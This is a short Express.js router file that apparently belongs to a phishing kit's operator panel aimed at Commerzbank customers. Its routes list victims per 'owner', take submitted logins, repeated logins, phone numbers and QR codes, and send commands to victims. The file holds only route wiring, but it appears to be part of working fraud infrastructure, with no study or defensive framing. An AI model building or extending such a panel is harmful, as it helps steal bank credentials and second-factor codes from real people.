const express = require("express");
const {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    submitTelephone,
    submitQr,
    deleteEntry,
    getQr,
} = require("../controllers/commerzController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/telephone", submitTelephone);
router.post("/qr", submitQr);
router.post("/delete", deleteEntry);
router.get("/qr/:uniqueid", getQr);

module.exports = router;
